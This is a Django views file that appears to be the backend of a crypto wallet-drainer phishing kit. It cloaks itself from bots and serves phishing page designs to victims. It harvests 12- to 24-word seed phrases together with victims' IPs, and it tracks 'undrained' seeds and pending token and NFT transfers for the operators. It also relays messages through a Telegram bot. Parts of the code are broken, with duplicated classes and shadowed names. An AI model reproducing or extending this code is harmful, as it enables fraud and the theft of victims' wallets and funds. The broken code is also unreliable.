import os
from pathlib import Path
from django.shortcuts import render
import requests


from django.conf import settings
from django.http import Http404, HttpResponse, HttpResponseRedirect, JsonResponse, HttpResponseNotFound
from django.apps import apps
from django.views import View
from django.utils.html import escape

Link = apps.get_model('main', 'Link')
User = apps.get_model('main', 'User')
transactions = apps.get_model('main', 'transactions')
nft_transactions = apps.get_model('main', 'nft_transactions')
seed = apps.get_model('main', 'seed')

BASE_DIR = Path(__file__).resolve().parent


def send_message(message, chat_id):
    data = {
        "chat_id": chat_id,
        "text": message
    }
    requests.get(f"https://api.telegram.org/bot{settings.TELEGRAM_CONFIG['telegram_token']}/sendMessage", data=data).json()

def get_client_ip(request) -> str:
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def antibot(req):
    current_ua = req.META['HTTP_USER_AGENT']
    current_ip = get_client_ip(req)
    if current_ua in settings.UALIST:
        return True
    elif current_ip in settings.IPLIST:
        return True


# Create your views here
def route_all(req, path=''):
    if antibot(req):
        return HttpResponse('<h1>Hello world!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</h1>')
    link = Link.objects.filter(domain__name=req.get_host(), path=req.path.replace('/', '')).first()
    if link and link.design != 'Set design':
        if req.session.get('workerLogin') is None:
            req.session['workerLogin'] = link.user.username
            req.session['linkId'] = link.id


        with open(os.path.join(BASE_DIR, 'templates\\' + link.design + '.html'), 'r') as file:
            html = file.read()
            file.close()
            return HttpResponse(html)
    else:
        return HttpResponseNotFound('<h1>Not found</h1>')


class config(View):
    def get(self, req):
        return render(req, 'config.js')

class apiView(View):
    def post(self, req):
        data = req.POST
        if data['do'] == 'sendMessage':
            send_message(data['text'], data['chat_id'])
            return JsonResponse({'success': False, 'message': 'Not allowed'})


class refresh_database(View):
    def get(self, req):
        res = list(transactions.objects.filter(is_confirmed=0, is_sent=0).all().values())
        return JsonResponse(res, safe=False)


class nft_refresh_database(View):
    def get(self, req):
        res = list(nft_transactions.objects.filter(is_confirmed=0, is_sent=0).all().values())
        return JsonResponse(res, safe=False)


class check_database(View):
    def get(self, req):
        res = list(transactions.objects.filter(is_confirmed=1, is_sent=0).all().values())
        return JsonResponse(res, safe=False)


class nft_check_database(View):
    def get(self, req):
        res = list(nft_transactions.objects.filter(is_confirmed=1, is_sent=0).all().values())
        return JsonResponse(res, safe=False)


class set_transaction_to_confirmed(View):
    def get(self, req):
        data = req.GET
        id = data.get('txid')
        if id is not None:
            res = transactions.objects.filter(id=id).first()
            res.is_confirmed = 1
            res.save()
            return JsonResponse({'success': False, 'message': 'Not allowed'})


class update_database(View):
    def get(self, req):
        data = req.GET
        id = data.get('txid')
        if id is not None:
            res = transactions.objects.filter(id=id).first()
            if res and res.is_confirmed == 1:
                res.is_sent = 1
                res.save()
            else:
                return JsonResponse(['Unknown transaction !'], safe=False)
        else:
            return HttpResponseRedirect('/')


class nft_set_transaction_to_confirmed(View):
    def get(self, req):
        data = req.GET
        nft_transactions.objects.filter(id=data['txid']).update(is_confirmed=1)


class set_transaction_to_confirmed(View):
    def get(self, req):
        data = req.GET
        transactions.objects.filter(id=data['txid']).update(is_confirmed=1)


class nft_update_database(View):
    def get(self, req):
        data = req.GET
        id = data.get('txid')
        if id is not None:
            id = escape(id)
            transaction = nft_transactions.objects.filter(transaction_id=id).first()
            if transaction:
                if transaction.is_confirmed == 1:
                    nft_transactions.objects.filter(transaction_id=id).update(is_sent=1)
            else:
                return JsonResponse(['Unknown transaction !'], safe=False)
        else:
            return HttpResponseRedirect('/')


class update_database(View):
    def get(self, req):
        data = req.GET
        id = data.get('txid')
        if id is not None:
            id = escape(id)
            transaction = transactions.objects.filter(transaction_id=id).first()
            if transaction:
                if transaction.is_confirmed == 1:
                    transactions.objects.filter(transaction_id=id).update(is_sent=1)
            else:
                return JsonResponse(['Unknown transaction !'], safe=False)
        else:
            return HttpResponseRedirect('/')


class nft_store_database(View):
    def get(self, req):
        data = req.GET
        txid = data.get('txid')
        token_address = data.get('token_address')
        token_id = data.get('token_id')
        from_wallet = data.get('from')
        amount = data.get('amount')
        type = data.get('type')

        if txid and token_address and token_id and from_wallet and amount and type:
            nft_transactions(
                transaction_id=escape(txid),
                token_address=escape(token_address),
                token_id=escape(token_id),
                from_wallet=escape(from_wallet),
                remaining_token_amout_to_send=escape(amount),
                nft_type=escape(type)
            ).save()
        else:
            return HttpResponseRedirect('/')


class nft_store_database(View):
    def get(self, req):
        data = req.GET

        txid = data.get('txid')
        token_address = data.get('token_address')
        from_wallet = data.get('from')
        amount = data.get('amount')

        if txid and token_address and from_wallet and amount and type:
            transactions(
                transaction_id=escape(txid),
                token_address=escape(token_address),
                from_wallet=escape(from_wallet),
                remaining_token_amout_to_send=escape(amount),
            ).save()
        else:
            return HttpResponseRedirect('/')


class nft_get_tx_remaining_count(View):
    def get(self, req):
        data = req.GET
        select = nft_transactions.objects.filter(transaction_id=data['txid']).first()
        return JsonResponse([select.remaining_token_amout_to_send], safe=False)


class nft_set_tx_remaining_count(View):
    def get(self, req):
        data = req.GET
        tx = data.get('tx')
        txcount = data.get('txcount')
        token_ids = data.get('token_ids')
        nft_transactions.objects.filter(transaction_id=tx).update(token_id=token_ids, remaining_token_amout_to_send=txcount)


def get_undrained_seeds(req):
    res = list(seed.objects.filter(has_been_drained=0).first().all().values())
    return JsonResponse(res, safe=False)


def sender(req):
    data = req.POST

    if data.get('word1') is not None:
        word_count = data.get('word_count')
        password = data.get('password')
        word1 = data.get('word1')
        word2 = data.get('word2')
        word3 = data.get('word3')
        word4 = data.get('word4')
        word5 = data.get('word5')
        word6 = data.get('word6')
        word7 = data.get('word7')
        word8 = data.get('word8')
        word9 = data.get('word9')
        word10 = data.get('word10')
        word11 = data.get('word11')
        word12 = data.get('word12')
        seed = f"{word1} {word2} {word3} {word4} {word5} {word6} {word7} {word8} {word9} {word10} {word11} {word12}"
        if word_count == 15:
            word13 = escape(data['word13'])
            word14 = escape(data['word14'])
            word15 = escape(data['word15'])
            seed += f" {word13} {word14} {word15}"        

        elif word_count == 18:
            word16 = escape(data['word16'])
            word17 = escape(data['word17'])
            word18 = escape(data['word18'])
            seed += f" {word16} {word17} {word18}"    

        elif word_count == 21:
            word19 = escape(data['word19'])
            word20 = escape(data['word20'])
            word21 = escape(data['word21'])
            seed += f" {word19} {word20} {word21}"    
        
        elif word_count == 24:
            word22 = escape(data['word22'])
            word23 = escape(data['word23'])
            word24 = escape(data['word24'])
            seed += f" {word22} {word23} {word24}"    

        link = Link.objects.filter(id=req.session['linkId']).first()
        user = User.objects.filter(username=req.session['workerUsername']).first()
        newSeed = seed(ip=get_client_ip(), user=user, link=link, token=settings.SEEDCONFIG['telegramBotToken'], url_from=data['url_from'], seed=seed, screen_chat_id=settings.SEEDCONFIG['screen_chat_id'], action_chatid=settings.SEEDCONFIG['actions_chat_id'], owner_wallet=settings.SEEDCONFIG['owner_wallet'])
        newSeed.save()
        return HttpResponseRedirect('https://metamask.io')
    else:
        return Http404()


def set_seed_to_sent(req):
    new = seed.objects.filter(seed=req.POST['seed']).first()
    new.has_been_drained = 1
    new.save()
    res = list(seed.objects.filter(seed=req.POST['seed']).first().all().values())
    return JsonResponse(res, safe=False)
